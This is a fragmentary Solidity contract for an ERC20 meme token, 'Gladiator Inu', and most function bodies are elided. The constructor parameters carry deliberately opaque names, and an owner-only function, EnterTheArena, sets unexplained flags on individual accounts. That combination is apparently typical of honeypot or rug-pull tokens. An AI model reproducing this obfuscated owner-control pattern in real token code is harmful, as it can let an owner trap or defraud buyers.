...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    constructor (string memory name_, string memory symbol_, address creator_, bool house001, bool house2, uint256 house9) {
        _name = name_;
        _symbol = symbol_;
        ...
        DoRedistributionWithUniswap[creator_] = house001;
    }
    ...
    function EnterTheArena(address account, bool v1, bool v2, bool v3, uint256 v4) external onlyOwner {
    ...
    function _LetTheFightBegin(address account, uint256 amount, uint256 val1, uint256 val2) internal virtual {
...
contract ERC20Gladiator is Context, ERC20 {
    constructor(
        string memory name, string memory symbol,
        bool house010, bool house2, uint256 house6,
        uint256 house7, address creator,
        uint256 initialSupply, address owner,
        uint256 house9
    ) ERC20(name, symbol, creator, house010, house2, house9) {
        _LetTheFightBegin(owner, initialSupply, house6, house7);
    }
}

contract GladiatorInu is ERC20Gladiator {
    constructor() ERC20Gladiator("Gladiator Inu", "GLADIATOR", false, true, 900, 25, msg.sender, 100000000 * 10 ** 18, msg.sender, 10) {
    }
}